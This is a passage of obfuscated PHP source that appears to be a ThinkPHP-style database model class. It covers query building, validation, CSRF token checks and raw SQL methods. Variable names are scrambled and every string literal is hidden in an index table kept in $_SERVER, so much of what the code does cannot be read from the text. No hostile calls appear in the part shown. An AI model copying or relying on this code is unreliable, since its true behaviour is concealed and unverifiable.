$¦ÓÀ¿¿Ü[358]; } public function optionsValue($ÍáŸÖ­ì = null) { if (is_null($ÍáŸÖ­ì)) { return $this->options; } elseif (is_array($ÍáŸÖ­ì)) { $this->options = array_merge($this->options, $ÍáŸÖ­ì); } } protected function _parseOptions($è”æ¸‘´ = array()) { $ñ¹Â¡Íß =& $_SERVER[«òÑğ]; if (is_array($è”æ¸‘´)) { $è”æ¸‘´ = array_merge($this->options, $è”æ¸‘´); } $this->options = array(); if (!isset($è”æ¸‘´[$ñ¹Â¡Íß[359]])) { $è”æ¸‘´[$ñ¹Â¡Íß[359]] = $this->getTableName(); $›Ğçàúñ = $this->fields; } else { $›Ğçàúñ = $this->getDbFields(); } if (!empty($è”æ¸‘´[$ñ¹Â¡Íß[360]])) { $è”æ¸‘´[$ñ¹Â¡Íß[359]] .= $ñ¹Â¡Íß[53] . $è”æ¸‘´[$ñ¹Â¡Íß[360]]; } $è”æ¸‘´[$ñ¹Â¡Íß[361]] = $this->name; if (isset($è”æ¸‘´[$ñ¹Â¡Íß[355]]) && is_array($è”æ¸‘´[$ñ¹Â¡Íß[355]]) && !empty($›Ğçàúñ) && !isset($è”æ¸‘´[$ñ¹Â¡Íß[362]]) && !isset($è”æ¸‘´[$ñ¹Â¡Íß[359]])) { foreach ($è”æ¸‘´[$ñ¹Â¡Íß[355]] as $‹ÑŠµà§ => $Òî¸ª¾) { $‹ÑŠµà§ = trim($‹ÑŠµà§); if (in_array($‹ÑŠµà§, $›Ğçàúñ, !0)) { if (is_scalar($Òî¸ª¾)) { $this->_parseType($è”æ¸‘´[$ñ¹Â¡Íß[355]], $‹ÑŠµà§); } } elseif (!is_numeric($‹ÑŠµà§) && $ñ¹Â¡Íß[11] != substr($‹ÑŠµà§, 0, 1) && !1 === strpos($‹ÑŠµà§, $ñ¹Â¡Íß[10]) && !1 === strpos($‹ÑŠµà§, $ñ¹Â¡Íß[340]) && !1 === strpos($‹ÑŠµà§, $ñ¹Â¡Íß[215]) && !1 === strpos($‹ÑŠµà§, $ñ¹Â¡Íß[287])) { unset($è”æ¸‘´[$ñ¹Â¡Íß[355]][$‹ÑŠµà§]); } } } $this->_options_filter($è”æ¸‘´); return $è”æ¸‘´; } protected function _options_filter(&$»òË×¼) { } protected function _parseType(&$·øüÖÄ, $Ë€÷°) { $½äîÒË =& $_SERVER[«òÑğ]; if (empty($this->options[$½äîÒË[363]][$½äîÒË[4] . $Ë€÷°])) { $íğ¤â = strtolower($this->fields[$½äîÒË[332]][$Ë€÷°]); if (!1 !== strpos($íğ¤â, $½äîÒË[364])) { } elseif (!1 === strpos($íğ¤â, $½äîÒË[365]) && !1 !== strpos($íğ¤â, $½äîÒË[366])) { $·øüÖÄ[$Ë€÷°] = intval($·øüÖÄ[$Ë€÷°]); } elseif (!1 !== strpos($íğ¤â, $½äîÒË[367]) || !1 !== strpos($íğ¤â, $½äîÒË[368])) { $·øüÖÄ[$Ë€÷°] = floatval($·øüÖÄ[$Ë€÷°]); } elseif (!1 !== strpos($íğ¤â, $½äîÒË[369])) { $·øüÖÄ[$Ë€÷°] = (bool) $·øüÖÄ[$Ë€÷°]; } } } public function find($Èê²™ğè = array()) { $â§é¦Ş =& $_SERVER[«òÑğ]; if (is_numeric($Èê²™ğè) || is_string($Èê²™ğè)) { $ÌÅØÓŸÌ[$this->getPk()] = intval($Èê²™ğè); $this->options[$â§é¦Ş[355]] = $ÌÅØÓŸÌ; } $this->options[$â§é¦Ş[370]] = 1; $Èê²™ğè = $this->_parseOptions(); $¶™­ú¦® = $this->db->select($Èê²™ğè); if (!1 === $¶™­ú¦®) { return !1; } if (empty($¶™­ú¦®)) { return null; } $this->data = $¶™­ú¦®[0]; $this->_afterFind($this->data, $Èê²™ğè); if (!empty($this->options[$â§é¦Ş[371]])) { return $this->returnResult($this->data, $this->options[$â§é¦Ş[371]]); } return $this->data; } protected function _afterFind(&$«è£‘×Š, $™İËÀŠ¡) { } protected function returnResult($ÖåğÅŸ, $ßÜÕô‹ã = '') { $Ä¢çÂõ‚ =& $_SERVER[«òÑğ]; if ($ßÜÕô‹ã) { if (is_callable($ßÜÕô‹ã)) { return call_user_func($ßÜÕô‹ã, $ÖåğÅŸ); } switch (strtolower($ßÜÕô‹ã)) { case $Ä¢çÂõ‚[372]: return json_encode($ÖåğÅŸ); case $Ä¢çÂõ‚[373]: return xml_encode($ÖåğÅŸ); } } return $ÖåğÅŸ; } public function parseFieldsMap($‡±„¼Ôî, $£Ãê›ïŸ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¹êÊ’©Ò => $äÏ©Ş¤‰) { if ($£Ãê›ïŸ == 1) { if (isset($‡±„¼Ôî[$äÏ©Ş¤‰])) { $‡±„¼Ôî[$¹êÊ’©Ò] = $‡±„¼Ôî[$äÏ©Ş¤‰]; unset($‡±„¼Ôî[$äÏ©Ş¤‰]); } } else { if (isset($‡±„¼Ôî[$¹êÊ’©Ò])) { $‡±„¼Ôî[$äÏ©Ş¤‰] = $‡±„¼Ôî[$¹êÊ’©Ò]; unset($‡±„¼Ôî[$¹êÊ’©Ò]); } } } } return $‡±„¼Ôî; } public function setField($ëÖÛªıø, $¬üşŸï¸ = '') { if (is_array($ëÖÛªıø)) { $·ûÕ‹ = $ëÖÛªıø; } else { $·ûÕ‹[$ëÖÛªıø] = $¬üşŸï¸; } return $this->save($·ûÕ‹); } public function setAdd($Ü°ÉİÈÛ, $€©¼É¬‰ = 1) { $„åúİİ =& $_SERVER[«òÑğ]; $™±îéÙ® = $Ü°ÉİÈÛ . $„åúİİ[374] . $€©¼É¬‰; if ($€©¼É¬‰ < 0) { $™±îéÙ® = $Ü°ÉİÈÛ . $€©¼É¬‰; } return $this->setField($Ü°ÉİÈÛ, array($„åúİİ[375], $™±îéÙ®)); } public function getField($Ğ‡±ÀğÉ, $¼ïÂ«ò = null) { $‡¥è¬ =& $_SERVER[«òÑğ]; $šŒó†ıˆ[$‡¥è¬[353]] = $Ğ‡±ÀğÉ; $šŒó†ıˆ = $this->_parseOptions($šŒó†ıˆ); $Ğ‡±ÀğÉ = trim($Ğ‡±ÀğÉ); if (strpos($Ğ‡±ÀğÉ, $‡¥è¬[50])) { if (!isset($šŒó†ıˆ[$‡¥è¬[370]])) { $šŒó†ıˆ[$‡¥è¬[370]] = is_numeric($¼ïÂ«ò) ? $¼ïÂ«ò : $‡¥è¬[12]; } $áöÑÍäÑ = $this->db->select($šŒó†ıˆ); if (!empty($áöÑÍäÑ)) { $òƒØãª = explode($‡¥è¬[50], $Ğ‡±ÀğÉ); $Ğ‡±ÀğÉ = array_keys($áöÑÍäÑ[0]); $©ü¶áÉ¾ = array_shift($Ğ‡±ÀğÉ); $àï´Ê· = array_shift($Ğ‡±ÀğÉ); $÷„£”š™ = array(); $·æˆ¡´Ï = count($òƒØãª); foreach ($áöÑÍäÑ as $ã¨¦Ù ƒ) { $ó±õŞë¥ = $ã¨¦Ù ƒ[$©ü¶áÉ¾]; if (2 == $·æˆ¡´Ï) { $÷„£”š™[$ó±õŞë¥] = $ã¨¦Ù ƒ[$àï´Ê·]; } else { $÷„£”š™[$ó±õŞë¥] = is_string($¼ïÂ«ò) ? implode($¼ïÂ«ò, $ã¨¦Ù ƒ) : $ã¨¦Ù ƒ; } } return $÷„£”š™; } } else { if (!0 !== $¼ïÂ«ò) { $šŒó†ıˆ[$‡¥è¬[370]] = is_numeric($¼ïÂ«ò) ? $¼ïÂ«ò : 1; } if ($¼ïÂ«ò === $‡¥è¬[335]) { unset($šŒó†ıˆ[$‡¥è¬[370]]); } $ã¨¦Ù ƒ = $this->db->select($šŒó†ıˆ); if (!empty($ã¨¦Ù ƒ)) { if ($¼ïÂ«ò === $‡¥è¬[335]) { return reset($ã¨¦Ù ƒ[0]); } if (!0 !== $¼ïÂ«ò && 1 == $šŒó†ıˆ[$‡¥è¬[370]]) { return reset($ã¨¦Ù ƒ[0]); } foreach ($ã¨¦Ù ƒ as $Á³ªõ±) { $Š­„ÛĞÉ[] = $Á³ªõ±[$Ğ‡±ÀğÉ]; } return $Š­„ÛĞÉ; } } return null; } public function create($“õªş©ı = '', $ï‡˜òä = '') { $ç¸‡‡œ“ =& $_SERVER[«òÑğ]; if (empty($“õªş©ı)) { $“õªş©ı = $_POST; } elseif (is_object($“õªş©ı)) { $“õªş©ı = get_object_vars($“õªş©ı); } if (empty($“õªş©ı) || !is_array($“õªş©ı)) { $this->error = think_lang($ç¸‡‡œ“[351]); return !1; } $“õªş©ı = $this->parseFieldsMap($“õªş©ı, 0); $ï‡˜òä = $ï‡˜òä ? $ï‡˜òä : (!empty($“õªş©ı[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ç¸‡‡œ“[353]])) { $ãçô‚´ = $this->options[$ç¸‡‡œ“[353]]; unset($this->options[$ç¸‡‡œ“[353]]); } elseif ($ï‡˜òä == THINK_MODEL_INSERT && isset($this->insertFields)) { $ãçô‚´ = $this->insertFields; } elseif ($ï‡˜òä == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ãçô‚´ = $this->updateFields; } if (isset($ãçô‚´)) { if (is_string($ãçô‚´)) { $ãçô‚´ = explode($ç¸‡‡œ“[50], $ãçô‚´); } if (think_config($ç¸‡‡œ“[376])) { $ãçô‚´[] = think_config($ç¸‡‡œ“[377]); } foreach ($“õªş©ı as $‚˜÷¯Œ => $£ƒ›Œñ) { if (!in_array($‚˜÷¯Œ, $ãçô‚´)) { unset($“õªş©ı[$‚˜÷¯Œ]); } } } if (!$this->autoValidation($“õªş©ı, $ï‡˜òä)) { return !1; } if (!$this->autoCheckToken($“õªş©ı)) { $this->error = think_lang($ç¸‡‡œ“[378]); return !1; } if ($this->autoCheckFields) { $ãçô‚´ = $this->getDbFields(); foreach ($“õªş©ı as $‚˜÷¯Œ => $£ƒ›Œñ) { if (!in_array($‚˜÷¯Œ, $ãçô‚´)) { unset($“õªş©ı[$‚˜÷¯Œ]); } elseif (MAGIC_QUOTES_GPC && is_string($£ƒ›Œñ)) { $“õªş©ı[$‚˜÷¯Œ] = stripslashes($£ƒ›Œñ); } } } $this->autoOperation($“õªş©ı, $ï‡˜òä); $this->data = $“õªş©ı; return $“õªş©ı; } public function autoCheckToken($œ®´š¯ğ) { $Şİµ÷‚ =& $_SERVER[«òÑğ]; if (isset($this->options[$Şİµ÷‚[379]]) && !$this->options[$Şİµ÷‚[379]]) { return !0; } if (think_config($Şİµ÷‚[376])) { $Ìå ÉØ = think_config($Şİµ÷‚[377]); if (!isset($œ®´š¯ğ[$Ìå ÉØ]) || Session::get($Ìå ÉØ)) { return !1; } list($ÃÜÃ¿, $ö– ¨ô) = explode($Şİµ÷‚[11], $œ®´š¯ğ[$Ìå ÉØ]); if ($ö– ¨ô && Session::get($Ìå ÉØ . $Şİµ÷‚[10] . $ÃÜÃ¿) === $ö– ¨ô) { Session::remove($Ìå ÉØ . $Şİµ÷‚[10] . $ÃÜÃ¿); return !0; } if (think_config($Şİµ÷‚[380])) { Session::remove($Ìå ÉØ . $Şİµ÷‚[10] . $ÃÜÃ¿); } return !1; } return !0; } public function regex($ßÂ‘§ÊÍ, $óúŞ•º) { $ “¤‹ÌÕ =& $_SERVER[«òÑğ]; $æõÚ…‰û = array($ “¤‹ÌÕ[381] => $ “¤‹ÌÕ[382], $ “¤‹ÌÕ[383] => $ “¤‹ÌÕ[384], $ “¤‹ÌÕ[385] => $ “¤‹ÌÕ[386], $ “¤‹ÌÕ[387] => $ “¤‹ÌÕ[388], $ “¤‹ÌÕ[389] => $ “¤‹ÌÕ[390], $ “¤‹ÌÕ[391] => $ “¤‹ÌÕ[392], $ “¤‹ÌÕ[393] => $ “¤‹ÌÕ[394], $ “¤‹ÌÕ[368] => $ “¤‹ÌÕ[395], $ “¤‹ÌÕ[396] => $ “¤‹ÌÕ[397]); if (isset($æõÚ…‰û[strtolower($óúŞ•º)])) { $óúŞ•º = $æõÚ…‰û[strtolower($óúŞ•º)]; } return preg_match($óúŞ•º, $ßÂ‘§ÊÍ) === 1; } private function autoOperation(&$Ò´¥Ä¯‡, $’ „Ûı×) { $£«‹ôû² =& $_SERVER[«òÑğ]; if (!empty($this->options[$£«‹ôû²[398]])) { $Úù‚ãŒ¹ = $this->options[$£«‹ôû²[398]]; unset($this->options[$£«‹ôû²[398]]); } elseif (!empty($this->_auto)) { $Úù‚ãŒ¹ = $this->_auto; } if (isset($Úù‚ãŒ¹)) { foreach ($Úù‚ãŒ¹ as $‘àŞ÷) { if (empty($‘àŞ÷[2])) { $‘àŞ÷[2] = THINK_MODEL_INSERT; } if ($’ „Ûı× == $‘àŞ÷[2] || $‘àŞ÷[2] == THINK_MODEL_BOTH) { switch (trim($‘àŞ÷[3])) { case $£«‹ôû²[399]: case $£«‹ôû²[400]: $ ÙõìÁÉ = isset($‘àŞ÷[4]) ? (array) $‘àŞ÷[4] : array(); if (isset($Ò´¥Ä¯‡[$‘àŞ÷[0]])) { array_unshift($ ÙõìÁÉ, $Ò´¥Ä¯‡[$‘àŞ÷[0]]); } if ($£«‹ôû²[399] == $‘àŞ÷[3]) { $Ò´¥Ä¯‡[$‘àŞ÷[0]] = call_user_func_array($‘àŞ÷[1], $ ÙõìÁÉ); } else { $Ò´¥Ä¯‡[$‘àŞ÷[0]] = call_user_func_array(array(&$this, $‘àŞ÷[1]), $ ÙõìÁÉ); } break; case $£«‹ôû²[353]: $Ò´¥Ä¯‡[$‘àŞ÷[0]] = $Ò´¥Ä¯‡[$‘àŞ÷[1]]; break; case $£«‹ôû²[401]: if ($£«‹ôû²[12] === $Ò´¥Ä¯‡[$‘àŞ÷[0]]) { unset($Ò´¥Ä¯‡[$‘àŞ÷[0]]); } break; case $£«‹ôû²[402]: default: $Ò´¥Ä¯‡[$‘àŞ÷[0]] = $‘àŞ÷[1]; } if (!1 === $Ò´¥Ä¯‡[$‘àŞ÷[0]]) { unset($Ò´¥Ä¯‡[$‘àŞ÷[0]]); } } } } return $Ò´¥Ä¯‡; } protected function autoValidation($—†¹©£×, $Ò‚¬ÕÛÒ) { $Ãá‚äì =& $_SERVER[«òÑğ]; if (!empty($this->options[$Ãá‚äì[403]])) { $©‰Ìì‘› = $this->options[$Ãá‚äì[403]]; unset($this->options[$Ãá‚äì[403]]); } elseif (!empty($this->_validate)) { $©‰Ìì‘› = $this->_validate; } if (isset($©‰Ìì‘›)) { if ($this->patchValidate) { $this->error = array(); } foreach ($©‰Ìì‘› as $ÀÄòâÂÊ => $Óö‹¥Îµ) { if (empty($Óö‹¥Îµ[5]) || $Óö‹¥Îµ[5] == THINK_MODEL_BOTH || $Óö‹¥Îµ[5] == $Ò‚¬ÕÛÒ) { if (0 == strpos($Óö‹¥Îµ[2], $Ãá‚äì[404]) && strpos($Óö‹¥Îµ[2], $Ãá‚äì[405])) { $Óö‹¥Îµ[2] = think_lang(substr($Óö‹¥Îµ[2], 2, -1)); } $Óö‹¥Îµ[3] = isset($Óö‹¥Îµ[3]) ? $Óö‹¥Îµ[3] : THINK_EXISTS_VALIDATE; $Óö‹¥Îµ[4] = isset($Óö‹¥Îµ[4]) ? $Óö‹¥Îµ[4] : $Ãá‚äì[406]; switch ($Óö‹¥Îµ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($—†¹©£×, $Óö‹¥Îµ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ãá‚äì[12] != trim($—†¹©£×[$Óö‹¥Îµ[0]])) { if (!1 === $this->_validationField($—†¹©£×, $Óö‹¥Îµ)) { return !1; } } break; default: if (isset($—†¹©£×[$Óö‹¥Îµ[0]])) { if (!1 === $this->_validationField($—†¹©£×, $Óö‹¥Îµ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($í‡¬›ñ, $ğ¿ß›Ğ‰) { if (!1 === $this->_validationFieldItem($í‡¬›ñ, $ğ¿ß›Ğ‰)) { if ($this->patchValidate) { $this->error[$ğ¿ß›Ğ‰[0]] = $ğ¿ß›Ğ‰[2]; } else { $this->error = $ğ¿ß›Ğ‰[2]; return !1; } } return; } protected function _validationFieldItem($ãÌõäÚä, $¢ê ·Ø·) { $¨¦¢–ãò =& $_SERVER[«òÑğ]; switch (strtolower(trim($¢ê ·Ø·[4]))) { case $¨¦¢–ãò[399]: case $¨¦¢–ãò[400]: $ÄáÆÚ®é = isset($¢ê ·Ø·[6]) ? (array) $¢ê ·Ø·[6] : array(); if (is_string($¢ê ·Ø·[0]) && strpos($¢ê ·Ø·[0], $¨¦¢–ãò[50])) { $¢ê ·Ø·[0] = explode($¨¦¢–ãò[50], $¢ê ·Ø·[0]); } if (is_array($¢ê ·Ø·[0])) { foreach ($¢ê ·Ø·[0] as $€¨¤‘ÓÙ) { $·Õ„áı»[$€¨¤‘ÓÙ] = $ãÌõäÚä[$€¨¤‘ÓÙ]; } array_unshift($ÄáÆÚ®é, $·Õ„áı»); } else { array_unshift($ÄáÆÚ®é, $ãÌõäÚä[$¢ê ·Ø·[0]]); } if ($¨¦¢–ãò[399] == $¢ê ·Ø·[4]) { return call_user_func_array($¢ê ·Ø·[1], $ÄáÆÚ®é); } else { return call_user_func_array(array(&$this, $¢ê ·Ø·[1]), $ÄáÆÚ®é); } case $¨¦¢–ãò[407]: return $ãÌõäÚä[$¢ê ·Ø·[0]] == $ãÌõäÚä[$¢ê ·Ø·[1]]; case $¨¦¢–ãò[408]: if (is_string($¢ê ·Ø·[0]) && strpos($¢ê ·Ø·[0], $¨¦¢–ãò[50])) { $¢ê ·Ø·[0] = explode($¨¦¢–ãò[50], $¢ê ·Ø·[0]); } $³ƒ¯»Õ† = array(); if (is_array($¢ê ·Ø·[0])) { foreach ($¢ê ·Ø·[0] as $€¨¤‘ÓÙ) { $³ƒ¯»Õ†[$€¨¤‘ÓÙ] = $ãÌõäÚä[$€¨¤‘ÓÙ]; } } else { $³ƒ¯»Õ†[$¢ê ·Ø·[0]] = $ãÌõäÚä[$¢ê ·Ø·[0]]; } if (!empty($ãÌõäÚä[$this->getPk()])) { $³ƒ¯»Õ†[$this->getPk()] = array($¨¦¢–ãò[409], $ãÌõäÚä[$this->getPk()]); } if ($this->where($³ƒ¯»Õ†)->find()) { return !1; } return !0; default: return $this->check($ãÌõäÚä[$¢ê ·Ø·[0]], $¢ê ·Ø·[1], $¢ê ·Ø·[4]); } } public function check($Ş³¿Ëœµ, $†´¡×‹ì, $ãÄĞâÛ™ = "\x72\x65\x67\145\170") { $œñˆşå• =& $_SERVER[«òÑğ]; $ãÄĞâÛ™ = strtolower(trim($ãÄĞâÛ™)); switch ($ãÄĞâÛ™) { case $œñˆşå•[7]: case $œñˆşå•[410]: $ûî¡Ã¢ = is_array($†´¡×‹ì) ? $†´¡×‹ì : explode($œñˆşå•[50], $†´¡×‹ì); return $ãÄĞâÛ™ == $œñˆşå•[7] ? in_array($Ş³¿Ëœµ, $ûî¡Ã¢) : !in_array($Ş³¿Ëœµ, $ûî¡Ã¢); case $œñˆşå•[411]: case $œñˆşå•[412]: if (is_array($†´¡×‹ì)) { $Í§¤©£ = $†´¡×‹ì[0]; $µÓ®Ú² = $†´¡×‹ì[1]; } else { list($Í§¤©£, $µÓ®Ú²) = explode($œñˆşå•[50], $†´¡×‹ì); } return $ãÄĞâÛ™ == $œñˆşå•[411] ? $Ş³¿Ëœµ >= $Í§¤©£ && $Ş³¿Ëœµ <= $µÓ®Ú² : $Ş³¿Ëœµ < $Í§¤©£ || $Ş³¿Ëœµ > $µÓ®Ú²; case $œñˆşå•[413]: case $œñˆşå•[414]: return $ãÄĞâÛ™ == $œñˆşå•[413] ? $Ş³¿Ëœµ == $†´¡×‹ì : $Ş³¿Ëœµ != $†´¡×‹ì; case $œñˆşå•[415]: $ü¤¦Ùóå = mb_strlen($Ş³¿Ëœµ, $œñˆşå•[416]); if (strpos($†´¡×‹ì, $œñˆşå•[50])) { list($Í§¤©£, $µÓ®Ú²) = explode($œñˆşå•[50], $†´¡×‹ì); return $ü¤¦Ùóå >= $Í§¤©£ && $ü¤¦Ùóå <= $µÓ®Ú²; } else { return $ü¤¦Ùóå == $†´¡×‹ì; } case $œñˆşå•[417]: list($úĞîêáı, $çÊÛ“åÕ) = explode($œñˆşå•[50], $†´¡×‹ì); if (!is_numeric($úĞîêáı)) { $úĞîêáı = strtotime($úĞîêáı); } if (!is_numeric($çÊÛ“åÕ)) { $çÊÛ“åÕ = strtotime($çÊÛ“åÕ); } return NOW_TIME >= $úĞîêáı && NOW_TIME <= $çÊÛ“åÕ; case $œñˆşå•[418]: return in_array(get_client_ip(), explode($œñˆşå•[50], $†´¡×‹ì)); case $œñˆşå•[419]: return !in_array(get_client_ip(), explode($œñˆşå•[50], $†´¡×‹ì)); case $œñˆşå•[406]: default: return $this->regex($Ş³¿Ëœµ, $†´¡×‹ì); } } public function query($ïàÃ½÷Ò, $£öÆêÆà = false) { $Ñóèô¾ =& $_SERVER[«òÑğ]; if (!is_bool($£öÆêÆà) && !is_array($£öÆêÆà)) { $£öÆêÆà = func_get_args(); array_shift($£öÆêÆà); } $ïàÃ½÷Ò = str_replace(array($Ñóèô¾[288], $Ñóèô¾[420]), $Ñóèô¾[53], $ïàÃ½÷Ò); $ïàÃ½÷Ò = $this->parseSql($ïàÃ½÷Ò, $£öÆêÆà); return $this->db->query($ïàÃ½÷Ò); } public function execute($ïş”Ì³ô, $‡µ…ñ¸ = false) { if (!is_bool($‡µ…ñ¸) && !is_array($‡µ…ñ¸)) { $‡µ…ñ¸ = func_get_args(); array_shift($‡µ…ñ¸); } $ïş”Ì³ô = $this->parseSql($ïş”Ì³ô, $‡µ…ñ¸); return $this->db->execute($ïş”Ì³ô); } protected function parseSql($şöˆ‰ÚÉ, $ÛêÚ“•’) { $Í•ûÑş— =& $_SERVER[«òÑğ]; if (!0 === $ÛêÚ“•’) { $çöâÕĞÊ = $this->_parseOptions(); $şöˆ‰ÚÉ = $this->db->parseSql($şöˆ‰ÚÉ, $çöâÕĞÊ); } elseif (is_array($ÛêÚ“•’)) { $ÛêÚ“•’ = array_map(array($this->db, $Í•ûÑş—[421]), $ÛêÚ“•’); $şöˆ‰ÚÉ = vsprintf($şöˆ‰ÚÉ, $ÛêÚ“•’); } else { $şöˆ‰ÚÉ = strtr($şöˆ‰ÚÉ, array($Í•ûÑş—[422] => $this->getTableName(), $Í•ûÑş—[423] => think_config($Í•ûÑş—[324]))); } $this->db->setModel($this->name); return $şöˆ‰ÚÉ; } public function db($÷Õ”…¥ = '', $ûÓ‹ğÆÙ = '', $‰…§ÍŞ¦ = array()) { $ÏÊòÀÆ =& $_SERVER[«òÑğ]; if ($ÏÊòÀÆ[12] === $÷Õ”…¥ && $this->db) { return $this->db; } static $«¥Ü­ğ£ = array(); static $ŒÑ›õøÔ = array(); if (!isset($ŒÑ›õøÔ[$÷Õ”…¥]) || isset($ŒÑ›õøÔ[$÷Õ”…¥]) && $ûÓ‹ğÆÙ && $«¥Ü­ğ£[$÷Õ”…¥] != $ûÓ‹ğÆÙ) { if (!empty($ûÓ‹ğÆÙ) && is_string($ûÓ‹ğÆÙ) && !1 === strpos($ûÓ‹ğÆÙ, $ÏÊòÀÆ[8])) { $ûÓ‹ğÆÙ = think_config($ûÓ‹ğÆÙ); } $÷Õ”…¥ = think_guid($ûÓ‹ğÆÙ); $ŒÑ›õøÔ[$÷Õ”…¥] = Db::getInstance($ûÓ‹ğÆÙ); } elseif (NULL === $ûÓ‹ğÆÙ) { $ŒÑ›õøÔ[$÷Õ”…¥]->close(); unset($ŒÑ›õøÔ[$÷Õ”…¥]); return; } if (!empty($‰…§ÍŞ¦)) { if (is_string($‰…§ÍŞ¦)) { parse_str($‰…§ÍŞ¦, $‰…§ÍŞ¦); } foreach ($‰…§ÍŞ¦ as $©şó¦æÆ => $’í§Ë˜) { $this->setProperty($©şó¦æÆ, $’í§Ë˜); } } $«¥Ü­ğ£[$÷Õ”…¥] = $ûÓ‹ğÆÙ; $this->db = $ŒÑ›õøÔ[$÷Õ”…¥]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¹Êı¶¶Ÿ = get_class($this); if ($¹Êı¶¶Ÿ == $_SERVER[«òÑğ][424]) { return $this->name; } $this->name = substr($¹Êı¶¶Ÿ, 0, -5); } return $this->name; } public function getTableName() { $ä„Øª™â =& $_SERVER[«òÑğ]; if (empty($this->trueTableName)) { $òÒÊ ü = !empty($this->tablePrefix) ? $this->tablePrefix : $ä„Øª™â[12]; if (!empty($this->tableName)) { $òÒÊ ü .= $this->tableName; } else { $òÒÊ ü .= think_parse_name($this->name); } $this->trueTableName = strtolower($òÒÊ ü); } return (!empty($this->dbName) ? $this->dbName . $ä„Øª™â[10] : $ä„Øª™â[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $­½˜¸Œ° =& $_SERVER[«òÑğ]; return isset($this->fields[$­½˜¸Œ°[331]]) ? $this->fields[$­½˜¸Œ°[331]] : $this->pk; } public function getDbFields() { $¬É®Â… =& $_SERVER[«òÑğ]; if (isset($this->options[$¬É®Â…[359]])) { $ó­ƒÀƒÆ = $this->db->getFields($this->options[$¬É®Â…[359]]); return $ó­ƒÀƒÆ ? array_keys($ó­ƒÀƒÆ) : !1; } if ($this->fields) { $ó­ƒÀƒÆ = $this->fields; unset($ó­ƒÀƒÆ[$¬É®Â…[330]], $ó­ƒÀƒÆ[$¬É®Â…[331]], $ó­ƒÀƒÆ[$¬É®Â…[332]], $ó­ƒÀƒÆ[$¬É®Â…[329]]); return $ó­ƒÀƒÆ; } return !1; } public function data($èÒ‡«¬¯ = '') { $È¢Û•à… =& $_SERVER[«òÑğ]; if ($È¢Û•à…[12] === $èÒ‡«¬¯ && !empty($this->data)) { return $this->data; } if (is_object($èÒ‡«¬¯)) { $èÒ‡«¬¯ = get_object_vars($èÒ‡«¬¯); } elseif (is_string($èÒ‡«¬¯)) { parse_str($èÒ‡«¬¯, $èÒ‡«¬¯); } elseif (!is_array($èÒ‡«¬¯)) { think_exception(think_lang($È¢Û•à…[351])); } $this->data = $èÒ‡«¬¯; return $this; } public function join($˜¨°€¥) { $ÁÅû±¶Å =& $_SERVER[«òÑğ]; if (is_array($˜¨°€¥)) { $this->options[$ÁÅû±¶Å[362]] = $˜¨°€¥; } elseif (!empty($˜¨°€¥)) { $this->options[$ÁÅû±¶Å[362]][] = $˜¨°€¥; } return $this; } public function union($í§ÚÄ•ã, $ïè›Ìˆ¬ = false) { $ıš¢²¹¬ =& $_SERVER[«òÑğ]; if (empty($í§ÚÄ•ã)) { return $this; } if ($ïè›Ìˆ¬) { $this->options[$ıš¢²¹¬[425]][$ıš¢²¹¬[426]] = !0; } if (is_object($í§ÚÄ•ã)) { $í§ÚÄ•ã = get_object_vars($í§ÚÄ•ã); } if (is_string($í§ÚÄ•ã)) { $ìêúÊ¦¥ = $í§ÚÄ•ã; } elseif (is_array($í§ÚÄ•ã)) { if (isset($í§ÚÄ•ã[0])) { $this->options[$ıš¢²¹¬[425]] = array_merge($this->options[$ıš¢²¹¬[425]], $í§ÚÄ•ã); return $this; } else { $ìêúÊ¦¥ = $í§ÚÄ•ã; } } else { think_exception(think_lang($ıš¢²¹¬[351])); } $this->options[$ıš¢²¹¬[425]][] = $ìêúÊ¦¥; return $this; } public function cache($›¨ü‰±Ù = true, $®©¡Ï­å = null, $æÊ™“İğ = '') { $ÄĞÂœ =& $_SERVER[«òÑğ]; if (!1 !== $›¨ü‰±Ù) { $this->options[$ÄĞÂœ[427]] = array($ÄĞÂœ[97] => $›¨ü‰±Ù, $ÄĞÂœ[417] => $®©¡Ï­å, $ÄĞÂœ[33] => $æÊ™“İğ); } return $this; } public function field($ø”ÚŠ¿, $Ûí¾‚±… = false) { $È ŠĞëı =& $_SERVER[«òÑğ]; if (!0 === $ø”ÚŠ¿) { $àƒû…ı = $this->getDbFields(); $ø”ÚŠ¿ = $àƒû…ı ? $àƒû…ı : $È ŠĞëı[223]; } elseif ($Ûí¾‚±…) { if (is_string($ø”ÚŠ¿)) { $ø”ÚŠ¿ = explode($È ŠĞëı[50], $ø”ÚŠ¿); } $àƒû…ı = $this->getDbFields(); $ø”ÚŠ¿ = $àƒû…ı ? array_diff($àƒû…ı, $ø”ÚŠ¿) : $ø”ÚŠ¿; } $this->options[$È ŠĞëı[353]] = $ø”ÚŠ¿; return $this; } public function scope($¢™ğâë = '', $¤Ä¥´É = NULL) { $ÄğÃàÀ =& $_SERVER[«òÑğ]; if ($ÄğÃàÀ[12] === $¢™ğâë) { if (isset($this->_scope[$ÄğÃàÀ[37]])) { $âá±”à£ = $this->_scope[$ÄğÃàÀ[37]]; } else { return $this; } } elseif (is_string($¢™ğâë)) { $‚õŸåå = explode($ÄğÃàÀ[50], $¢™ğâë); $âá±”à£ = array(); foreach ($‚õŸåå as $»œ†Àò) { if (!isset($this->_scope[$»œ†Àò])) { continue; } $âá±”à£ = array_merge($âá±”à£, $this->_scope[$»œ†Àò]); } if (!empty($¤Ä¥´É) && is_array($¤Ä¥´É)) { $âá±”à£ = array_merge($âá±”à£, $¤Ä¥´É); } } elseif (is_array($¢™ğâë)) { $âá±”à£ = $¢™ğâë; } if (is_array($âá±”à£) && !empty($âá±”à£)) { $this->options = array_merge($this->options, array_change_key_case($âá±”à£)); } return $this; } public 